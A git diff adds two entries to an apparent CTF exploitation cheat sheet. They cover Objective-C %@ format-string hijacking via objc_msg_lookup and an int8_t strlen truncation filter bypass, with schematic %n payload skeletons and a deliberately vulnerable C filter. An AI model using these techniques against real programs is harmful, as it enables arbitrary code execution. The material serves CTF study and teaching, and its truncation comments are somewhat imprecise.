@@ -14,6 +14,8 @@
 - [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
 - [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
 - [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
+- [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
+- [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
 
 ---
 
@@ -450,3 +452,67 @@ libc_base = libc_leak - known_offset
 **When to recognize:** Format string vulnerability with only one shot before `exit()` or another terminating function. The single-call technique avoids needing a loop or re-entry mechanism before establishing one.
 
 **References:** picoCTF 2017
+
+---
+
+## Objective-C %@ Format Specifier Exploitation (SHA2017)
+
+**Pattern:** Objective-C's `NSLog` and related functions support the `%@` format specifier, which calls `objc_msg_lookup(rdi, ...)` treating the corresponding stack value as an Objective-C object pointer. Control the stack value pointed to by `%N$@` to control `rdi`. Analysis of `objc_msg_lookup` reveals a `call rax` gadget reachable with crafted conditions, enabling one-shot execution.
+
+**Mechanism:**
+```text
+NSLog(@"Hello %@", user_input)
+    → %@ consumes next argument from stack
+    → argument is treated as Objective-C object pointer (rdi)
+    → objc_msg_lookup(rdi, "description") is called
+    → if [rdi+8] == 0 (ISA check fails), execution reaches: call rax
+    → rax is under attacker control via the crafted "object"
+```
+
+**Exploitation:**
+```python
+# Craft a fake Objective-C object on the stack via format string write
+# Object layout: [isa_ptr][method_list_ptr][...]
+# Set isa_ptr = 0 to reach the call rax path in objc_msg_lookup
+# Set rax = one_gadget or system() via prior %n writes
+
+# Locate %N$@ position: stack offset where fake object pointer lands
+# Use %n to write fake object address at the right stack slot
+# Then trigger %@ to call objc_msg_lookup → call rax → shell
+payload = b'%<distance>c%<write_offset>$lln'  # write fake obj addr
+payload += b'%<obj_offset>$@'                  # trigger call rax
+```
+
+**Key insight:** Objective-C format strings include `%@` which invokes `objc_msg_lookup` on a stack pointer — turns a read-only FSB into a controlled-call primitive via the objc runtime. The `call rax` gadget inside `objc_msg_lookup` is reachable when the ISA pointer check fails, making a crafted "null ISA" object sufficient to redirect execution.
+
+**References:** SHA2017
+
+---
+
+## strlen Integer Truncation Bypass (ASIS CTF Finals 2017)
+
+**Pattern:** Binary filters format string input by checking that each character up to `strlen(input)+1` is lowercase. However, the `strlen()` result is cast to `int8_t`: at input length 255, `(int8_t)(255 + 1)` overflows to 0, collapsing the sanitization window to an empty range. Format specifiers like `%n` placed beyond byte 255 bypass the filter entirely.
+
+**Vulnerable code pattern:**
+```c
+void filter(char *input) {
+    int8_t len = (int8_t)strlen(input);  // truncates at 255 → wraps to -1 or 0
+    for (int8_t i = 0; i <= len; i++) {  // at len==-1 (255 cast): 0 <= -1 is false
+        if (!islower(input[i]))
+            reject();
+    }
+}
+```
+
+**Exploitation:**
+```python
+# Pad with 255 lowercase bytes, then place %n-based payload starting at byte 255
+# The filter checks bytes 0..len, but len wraps to -1 (or 0+1=0), so no bytes checked
+filler = b'a' * 255
+exploit_suffix = b'%7$n' + p64(target_addr)  # unchecked bytes
+payload = filler + exploit_suffix
+```
+
+**Key insight:** `strlen()` cast to `int8_t` produces signed overflow at length 255, collapsing the sanitization window to zero. Any payload content placed at or beyond byte 255 escapes the filter. Always check for integer truncation when a length field is stored in a signed or short type.
+
+**References:** ASIS CTF Finals 2017
